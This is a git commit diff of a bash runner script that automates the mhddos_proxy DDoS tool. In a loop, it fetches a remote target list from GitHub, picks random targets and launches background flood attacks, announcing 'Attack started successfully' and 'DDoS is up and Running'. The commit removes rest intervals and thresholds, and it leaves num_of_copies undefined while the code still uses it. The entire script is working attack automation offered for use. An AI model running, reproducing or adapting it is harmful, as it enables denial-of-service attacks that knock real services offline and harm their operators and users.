17269d2bbe89b6295c337768ecf3b1497bcc4ac4
Maxssaf <101875980+Maxssaf@users.noreply.github.com>
2022-04-14 22:13:14 +0300

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-restart_interval="20m"
+
 
 ulimit -n 1048576
 # TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
@@ -15,134 +15,58 @@ taskkill -f -im python3.8.exe
 taskkill -f -im python3.9.exe
 taskkill -f -im python3.10.exe
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
-# for Docker
-#echo "Kill all useless docker-containers with MHDDoS"
-#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-#echo "Docker useless containers killed"
 
+
+restart_interval="300"
+
+#parameters that passed to python scrypt
+threads="${2:-1000}"
+threads="-t $threads"
+rpc="${3:-2000}"
+rpc="--rpc $rpc"
 proxy_interval="1200"
 proxy_interval="-p $proxy_interval"
 
-num_of_copies="${1:-1}"
-threads="${2:-3000}"
-if ((threads < 2000));
-then
-	threads=2000
-fi
 
-rpc="${3:-1000}"
-if ((rpc < 1000));
-then
-	rpc=1000
-fi
 
-debug="${4:-}"
-if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
-then
-	debug="--debug"
-fi
+
 
 
 #Installing files into correct directory
 cd ~
-git clone https://github.com/alexnest-ua/runner_for_windows.git
+git clone https://github.com/Maxssaf/runner_for_windows.git
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd ~/mhddos_proxy
 python -m pip install -r requirements.txt
 
 
+while true
+echo -e "#####################################\n"
+do
+   # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
+   list_size=$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]" | wc -l)
 
-# Restart attacks and update targets list every 10 minutes (by default)
-while [ 1 == 1 ]
-do	
-	cd ~/mhddos_proxy
+   echo -e "\nNumber of targets in list: " $list_size "\n"
 
+   # Create list with random numbers. To choose random targets from list on next step.
+   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+   echo -e "random number(s): " $random_numbers "\n"
 
-	num0=$(git pull origin main | grep -P -c 'Already|Уже')
-   	echo "$num0"
-   	
-   	if ((num0 == 1));
-   	then	
-		clear
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
-	else
-		cd ~/mhddos_proxy
-		clear
-		pip3 install -r requirements.txt
-		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
-	fi
-	
-	
-	cd ~/runner_for_windows
-   	num=$(git pull origin main | grep -P -c 'Already|Уже')
-   	echo "$num"
-   	
-   	if ((num == 1));
-   	then	
-		clear
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
-	else
-		cd ~/runner_for_windows
-		clear
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
-		bash runner.sh $num_of_copies $threads $rpc $debug& # run new downloaded script 
-		#pkill -o -f runner.sh
-		return 0
-		#exit #terminate old script
-	fi
-	#
-   	
-	
-   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
-	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
-	
-   	if (("$num_of_copies" == "all"));
-	then	
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies > list_size));
-	then 
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies < 1));
-	then
-		num_of_copies=1
-		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
-	else
-		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
-	fi
-	
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
-      
-   	# Launch multiple mhddos_proxy instances with different targets.
-   	for i in $random_numbers
-   	do
-            echo -e "\n I = $i"
+   # Print all randomly selected targets on screen
+   echo -e "Choosen target(s): "
+   for i in $random_numbers
+   do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
-           
-
-            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            echo "python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
-            
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
+            echo -e " "$cmd_line"\n"
+            #echo $cmd_line
+            #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
-            #docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
-            python runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
+            python3 runner.py --table $cmd_line $proxy_interval $rpc&    ##$threads
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
-   	done
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
-   	sleep $restart_interval
+   done
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
+	sleep $restart_interval
 	clear
    	
    	#Just in case kill previous copy of mhddos_proxy
@@ -153,13 +77,4 @@ do
 	taskkill -f -im python3.10.exe
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
-   	no_ddos_sleep="$(shuf -i 1-4 -n 1)m"
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
-	sleep $no_ddos_sleep
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
-	
-	# for docker
-   	#echo "Kill all useless docker-containers with MHDDoS"
-   	#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-   	#echo "Docker useless containers killed"
 done
